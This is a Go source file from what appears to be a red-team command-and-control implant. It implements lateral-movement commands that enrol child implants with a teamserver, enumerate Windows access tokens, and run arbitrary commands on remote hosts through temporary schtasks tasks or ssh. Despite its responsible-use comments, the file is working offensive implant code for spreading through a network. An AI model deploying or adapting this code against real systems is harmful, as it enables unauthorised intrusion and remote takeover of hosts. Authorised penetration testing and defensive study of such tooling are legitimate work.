package exec

// lateral.go holds the lateral.* verbs the reference implant advertises
// (architecture.md Sec 10.1). lateral.move (M9.1) derives a child implant.
// lateral.token and lateral.exec_remote (ADR 0004) cover the standard
// access-token and remote-execution surfaces every mainstream C2 exposes: on
// Windows, the documented administration channels (whoami for token context,
// schtasks for remote execution); on Linux, SSH for remote execution and a
// clear "Windows-only" refusal for token work.
//
// The child's stager token is not baked into this implant (its own token is
// spent at its own enroll); the operator provisions it in the task arguments.
// This keeps derivation inside the M5.2 token-gated authorization model -- the
// server still resolves and scope-checks the parent before recording the
// linkage -- and mirrors how the recon verbs take their target in arguments.
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test (RESPONSIBLE-USE.md).

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/cw/rod/implant/internal/c2"
	"github.com/cw/rod/implant/rodpb"
)

// lateralMove derives a child implant by enrolling a fresh identity against the
// teamserver this implant enrolled into, naming itself as the parent
// (architecture.md Sec 10.1). Arguments are "<token>" or "<token> <class>",
// whitespace-separated; the token is the child's stager secret (provisioned by
// the operator) and the optional class names a non-default implant class.
//
// The outcome is Succeeded with the child implant id on the first line when the
// enroll round-trip completes, and Failed with a clear cause otherwise. A
// handler built without an enroll bundle (derivation disabled) reports Failed
// so the operator sees the cause rather than a silent no-op.
func (r *Runner) lateralMove(ctx context.Context, arguments string) (rodpb.TaskOutcome, string) {
	if r.enroll == nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "lateral.move is not available (no enroll bundle)"
	}
	token, class, ok := parseMoveArgs(arguments)
	if !ok {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "lateral.move expects '<token>' or '<token> <class>'"
	}
	if ctx.Err() != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, ctx.Err().Error()
	}

	// A child owns its own keypair; only the public half crosses enroll
	// (architecture.md Sec 9). 2048-bit RSA matches the parent's key size.
	childKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "generate child key: " + err.Error()
	}

	enrolled, err := c2.Enroll(r.enroll.URL, token, r.enroll.ParentID, childKey, r.enroll.CAs, r.enroll.Profile)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "enroll child: " + err.Error()
	}
	_ = class // accepted for symmetry with the enroll request; the server defaults it.

	// Report the child id so the operator can confirm the recorded lineage. The
	// server echoes the parent back on the response, so include it when present
	// as an independent confirmation the linkage landed.
	out := enrolled.ImplantID
	if enrolled.ParentImplantID != "" {
		out += "\nparent=" + enrolled.ParentImplantID
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, out
}

// parseMoveArgs splits the lateral.move argument string into the child stager
// token and an optional implant class. Returns ok=false when the token is empty
// or more than two fields are present, mirroring the recon verbs' strict parse.
func parseMoveArgs(arguments string) (token, class string, ok bool) {
	fields := strings.Fields(arguments)
	if len(fields) == 0 || len(fields) > 2 {
		return "", "", false
	}
	if len(fields) == 2 {
		return fields[0], fields[1], true
	}
	return fields[0], "", true
}

// lateralToken reports the current process's access-token context -- the user,
// groups, and privileges that determine what impersonation and lateral movement
// are possible from this implant (architecture.md Sec 10.1, ADR 0004). It is a
// read-only enumeration; it does not duplicate, steal, or apply any token.
//
// Access tokens are a Windows concept. On Windows the handler runs
// `whoami /user /groups /priv`, the documented administration command for
// inspecting the calling process's token. On other platforms it reports a
// clear Windows-only refusal so the operator sees the cause rather than a
// silent no-op. The optional argument is informational only.
func (r *Runner) lateralToken(ctx context.Context, _ string) (rodpb.TaskOutcome, string) {
	if runtime.GOOS != "windows" {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"lateral.token is a Windows access-token capability; not supported on " + runtime.GOOS
	}
	out, err := exec.CommandContext(ctx, "whoami", "/user", "/groups", "/priv").CombinedOutput()
	output := string(out)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, appendIfMissing(output, err.Error())
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.TrimRight(output, "\r\n")
}

// lateralExecRemote runs a command on a remote host over a documented
// administration channel (architecture.md Sec 10.1, ADR 0004). Arguments are
// "<host> <command...>" (e.g. "dc01 hostname"). On Windows the handler drives
// the built-in scheduled-task workflow against the target -- create a task,
// run it, then delete it -- the same surface PsExec-class tools and every
// Windows administration guide document; the task's stdout is not captured back
// over RPC, so the outcome reflects whether the task was created and run, and
// the operator reads results off the target or via a later shell.exec. On
// Linux the handler runs ssh <host> <command>, capturing its combined output.
func (r *Runner) lateralExecRemote(ctx context.Context, arguments string) (rodpb.TaskOutcome, string) {
	host, command, ok := parseExecRemoteArgs(arguments)
	if !ok {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"lateral.exec_remote expects '<host> <command...>'"
	}
	if ctx.Err() != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, ctx.Err().Error()
	}

	if runtime.GOOS == "windows" {
		return runRemoteScheduledTask(ctx, host, command)
	}
	return runRemoteSSH(ctx, host, command)
}

// runRemoteScheduledTask creates, runs, and deletes a one-shot scheduled task
// named with a stable Rod prefix on the remote host. It mirrors the documented
// `schtasks /create /s <host> ... /run` workflow every Windows administration
// reference describes. The RPC channel does not return the task's stdout, so
// the outcome is whether the task was created and run; the operator reads
// results off the target. A failure at any step cleans up the task before
// reporting.
func runRemoteScheduledTask(ctx context.Context, host, command string) (rodpb.TaskOutcome, string) {
	const taskPrefix = "RodRemoteExec"
	taskName := fmt.Sprintf("%s%d", taskPrefix, nowMillis())

	create := exec.CommandContext(ctx, "schtasks",
		"/create", "/s", host, "/tn", taskName, "/tr", command, "/sc", "once", "/st", "00:00", "/f")
	if out, err := create.CombinedOutput(); err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"create remote task " + taskName + " on " + host + ": " + appendIfMissing(string(out), err.Error())
	}

	run := exec.CommandContext(ctx, "schtasks", "/run", "/s", host, "/tn", taskName)
	if out, err := run.CombinedOutput(); err != nil {
		cleanupRemoteTask(ctx, host, taskName)
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
			"run remote task " + taskName + " on " + host + ": " + appendIfMissing(string(out), err.Error())
	}

	cleanupRemoteTask(ctx, host, taskName)
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
		"ran " + command + " on " + host + " via task " + taskName
}

// cleanupRemoteTask deletes a remote scheduled task, ignoring errors so a
// failed run still reports its cause rather than the cleanup's.
func cleanupRemoteTask(ctx context.Context, host, taskName string) {
	_ = exec.CommandContext(ctx, "schtasks", "/delete", "/s", host, "/tn", taskName, "/f").Run()
}

// runRemoteSSH runs the command on the remote host via ssh, capturing the
// combined output. ssh handles key/auth negotiation per the implant's
// environment; no credentials are baked in.
func runRemoteSSH(ctx context.Context, host, command string) (rodpb.TaskOutcome, string) {
	out, err := exec.CommandContext(ctx, "ssh", host, command).CombinedOutput()
	output := string(out)
	if err != nil {
		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, appendIfMissing(output, err.Error())
	}
	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.TrimRight(output, "\r\n")
}

// parseExecRemoteArgs splits "<host> <command...>" into the host and the
// command string. The command keeps its internal whitespace; only the first
// token is the host. Returns ok=false when fewer than two fields are present.
func parseExecRemoteArgs(arguments string) (host, command string, ok bool) {
	fields := strings.Fields(arguments)
	if len(fields) < 2 {
		return "", "", false
	}
	return fields[0], strings.Join(fields[1:], " "), true
}

// nowMillis is the current Unix time in milliseconds, used to give each remote
// scheduled task a unique name without pulling in a wider time API.
func nowMillis() int64 {
	return time.Now().UnixMilli()
}
